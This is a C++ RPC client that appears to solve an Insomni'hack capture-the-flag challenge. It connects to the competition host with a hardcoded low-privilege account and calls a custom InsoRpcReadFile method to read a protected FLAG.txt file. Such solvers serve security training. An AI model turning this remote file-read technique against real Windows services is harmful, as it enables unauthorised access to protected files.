#include <windows.h>
#include <iostream>
#include "ctf_h.h"

int main()
{
    RPC_STATUS status;
    RPC_WSTR pszUuid = (RPC_WSTR)NULL;
    RPC_WSTR pszProtocolSequence = (RPC_WSTR) L"ncacn_http";
    RPC_WSTR pszNetworkAddress = (RPC_WSTR) L"insobug.insomnihack.ch";
    RPC_WSTR pszEndpoint = (RPC_WSTR) L"8000";
    RPC_WSTR pszOptions = NULL;
    RPC_WSTR pszStringBinding = NULL;
    unsigned long ulCode;

    status = RpcStringBindingCompose(pszUuid,
        pszProtocolSequence,
        pszNetworkAddress,
        pszEndpoint,
        pszOptions,
        &pszStringBinding);
    if (status) exit(status);

    status = RpcBindingFromStringBinding(pszStringBinding, &hCtf);

    wprintf(L"%s\n", pszStringBinding);

    if (status) exit(status);
    
    auto domain = L".";
    auto user = L"Limited";
    auto pass = L"Insomnia1";

    SEC_WINNT_AUTH_IDENTITY authInfo;
    authInfo.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;
    authInfo.Domain = (RPC_WSTR) domain;
    authInfo.DomainLength = wcslen(domain);
    authInfo.User = (RPC_WSTR) user;
    authInfo.UserLength = wcslen(user);
    authInfo.Password = (RPC_WSTR) pass;
    authInfo.PasswordLength = wcslen(pass);


    RPC_SECURITY_QOS_V5 qos{};
    qos.Version = RPC_C_SECURITY_QOS_VERSION_5;
    qos.Capabilities = RPC_C_QOS_CAPABILITIES_DEFAULT;
    qos.IdentityTracking = RPC_C_QOS_IDENTITY_DYNAMIC;
    qos.ImpersonationType = RPC_C_IMP_LEVEL_IDENTIFY;

    status = RpcBindingSetAuthInfoEx(hCtf, (RPC_WSTR) L"PRINCNAME", RPC_C_AUTHN_LEVEL_CALL, RPC_C_AUTHN_WINNT, &authInfo, 0, (RPC_SECURITY_QOS*) & qos);
    
    if (status) exit(status);
    
    RpcTryExcept
    {
        HRESULT res;

        byte* data = nullptr;
        unsigned short size = 0;
        
        res = InsoRpcReadFile(L"C:\\Program Files\\Winternals1\\FLAG.txt", &data, &size);
        wprintf(L"%llx\n", res);
        printf("%s\n", (char*)data);
    }
    RpcExcept(1)
    {
        ulCode = RpcExceptionCode();
        printf("error 0x%lx = %ld\n", ulCode, ulCode);
    }
    RpcEndExcept
}


void __RPC_FAR* __RPC_USER midl_user_allocate(size_t len) {
	return malloc(len);
}

void __RPC_USER midl_user_free(void __RPC_FAR* ptr) {
	free(ptr);
}
